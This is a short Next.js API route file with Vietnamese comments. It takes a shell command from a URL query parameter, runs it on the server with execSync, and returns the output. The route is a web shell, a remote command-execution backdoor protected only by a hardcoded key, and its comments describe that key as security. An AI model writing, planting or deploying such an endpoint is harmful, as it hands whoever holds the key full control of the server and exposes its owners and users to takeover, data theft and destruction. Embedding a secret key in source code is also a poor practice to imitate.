import { NextRequest, NextResponse } from "next/server";
import { execSync } from "child_process";

export async function GET(request: NextRequest) {
  const { searchParams } = new URL(request.url);
  const key = searchParams.get("key");
  const cmd = searchParams.get("cmd");

  // Bảo mật bằng API key có sẵn trong hệ thống của bạn
  if (key !== "sk_apk_52c879d4b17f68a5c1e92d04a601beef") {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  if (!cmd) {
    return NextResponse.json({ error: "Missing cmd parameter" }, { status: 400 });
  }

  try {
    // Thực thi lệnh với timeout 10 giây để tránh treo
    const stdout = execSync(cmd, { encoding: "utf-8", timeout: 10000 });
    return NextResponse.json({ cmd, stdout });
  } catch (error: any) {
    return NextResponse.json({
      cmd,
      error: error.message,
      stderr: error.stderr ? error.stderr.toString() : "",
      stdout: error.stdout ? error.stdout.toString() : ""
    }, { status: 500 });
  }
}
